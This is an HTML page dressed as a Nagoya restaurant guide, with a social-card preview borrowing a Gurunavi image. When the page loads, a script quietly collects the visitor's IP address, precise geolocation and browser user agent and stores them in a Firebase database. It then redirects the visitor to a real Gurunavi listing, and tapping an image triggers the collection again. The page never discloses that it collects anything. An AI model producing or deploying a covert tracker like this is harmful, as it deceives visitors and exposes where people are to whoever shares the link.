<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>大人のレストランガイド</title>
    <!-- Xカード用のメタタグ -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content=""> 
    <meta name="twitter:title" content="大人のレストランガイド">
    <meta name="twitter:description" content="名古屋市内の厳選スポットをご紹介">
    <meta name="twitter:image" content="https://rimage.gnst.jp/business-dinner/img/img_ogp.8706f81e82af80879aed541352e0808f2d6737ef8fba8d06481916c2d73bb81e.png"> 
    <style>
        html, body {
            overflow: hidden; /* スクロールを無効化 */
            height: 100%;
            width: 100%;
            position: fixed; /* 画面を固定 */
            top: 0;
            left: 0;
            background-color: #111111; /* ほぼ黒に近いグレー */
            color: white;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: 'MS Mincho', 'Yu Mincho', serif; /* 明朝体 */
        }
        h1 {
            font-size: 1.5em;
            text-align: center;
            margin-bottom: 20px;
        }
        .image-container {
            position: relative;
            width: 80%;
            max-width: 600px;
            aspect-ratio: 1 / 1; /* 正方形 */
            overflow: hidden;
        }
        .fade-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0;
            transform: scale(1.1); /* 初期状態で少し拡大 */
            transition: opacity 1s ease-in-out, transform 3s ease-in-out;
        }
        .fade-image.active {
            opacity: 1;
            transform: scale(1); /* 元のサイズに戻す */
        }
    </style>
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
        import { getDatabase, ref, push, set, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA5jiMfUjtZo7BUpsFM0xUVzfeJ5_fakkI",
            authDomain: "gurunavi-nagoya.firebaseapp.com",
            databaseURL: "https://gurunavi-nagoya-default-rtdb.firebaseio.com",
            projectId: "gurunavi-nagoya",
            storageBucket: "gurunavi-nagoya.firebasestorage.app",
            messagingSenderId: "181576688818",
            appId: "1:181576688818:web:f82fb20a8d58ef46c615ab"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('IP取得エラー:', error);
                return '不明';
            }
        }

        async function recordData() {
            const ip = await getIP();
            const userAgent = navigator.userAgent;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const data = {
                            ip: ip,
                            latitude: latitude,
                            longitude: longitude,
                            userAgent: userAgent,
                            timestamp: serverTimestamp()
                        };
                        await sendToFirebase(data);
                        window.location.href = 'https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/';
                    },
                    async (error) => {
                        console.error('位置情報エラー:', error.message);
                        const data = {
                            ip: ip,
                            latitude: '拒否',
                            longitude: '拒否',
                            userAgent: userAgent,
                            timestamp: serverTimestamp()
                        };
                        await sendToFirebase(data);
                        alert('位置情報の取得に失敗しました');
                    },
                    {
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                const data = {
                    ip: ip,
                    latitude: '非対応',
                    longitude: '非対応',
                    userAgent: userAgent,
                    timestamp: serverTimestamp()
                };
                await sendToFirebase(data);
                alert('位置情報の取得に失敗しました');
            }
        }

        async function sendToFirebase(data) {
            try {
                const newRef = ref(database, 'userData');
                const newEntry = push(newRef);
                await set(newEntry, data);
                console.log('データ送信成功');
            } catch (error) {
                console.error('送信エラー:', error);
            }
        }

        recordData(); // 初回読み込み時に実行
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const images = document.querySelectorAll('.fade-image');
            let currentIndex = 0;

            function showNextImage() {
                images[currentIndex].classList.remove('active');
                currentIndex = (currentIndex + 1) % images.length;
                images[currentIndex].classList.add('active');
            }

            setTimeout(() => {
                images[currentIndex].classList.add('active');
            }, 100);

            setInterval(showNextImage, 4000);

            // 画像タップで位置情報再取得
            images.forEach(image => {
                image.addEventListener('click', () => {
                    recordData();
                });
            });
        });

        // タッチによるスクロールを無効化
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
    </script>
</head>
<body>
    <h1>大人のレストランガイド</h1>
    <div class="image-container">
        <img src="niku1.jpg" class="fade-image" alt="焼肉1">
        <img src="niku2.jpg" class="fade-image" alt="焼肉2">
        <img src="niku3.jpg" class="fade-image" alt="焼肉3">
    </div>
</body>
</html>
